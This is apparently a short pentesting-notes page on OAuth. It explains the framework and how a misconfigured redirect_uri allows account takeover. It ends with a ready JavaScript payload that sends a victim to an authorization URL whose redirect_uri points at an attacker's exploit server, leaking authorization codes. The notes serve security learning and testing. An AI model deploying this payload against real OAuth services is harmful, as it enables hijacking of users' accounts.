---
title: OAuth
source_url: https://notes.incendium.rocks/pentesting-notes/web/oauth
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---
OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FG5aqTpQ76vVQvNAOxwSx%2Fauth_blog-02-1-2048x1072-1320921079.jpg?alt=media&amp;token=b89d3546-4c1c-4cf1-917e-a3b380c1a9a5" alt=""><figcaption></figcaption></figure>

## Redirect URI

The `redirect_uri` is crucial for security in OAuth and OpenID implementations, as it directs where sensitive data, like authorization codes, are sent post-authorization. If misconfigured, it could allow attackers to redirect these requests to malicious servers, enabling account takeover.

Exploit example, we redirect a user to our exploit server:

```javascript
<script>
location="https://oauth-server.net/auth?client_id=e952oznwwqeok31q0uwpp&redirect_uri=https://you.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"
</script>
```
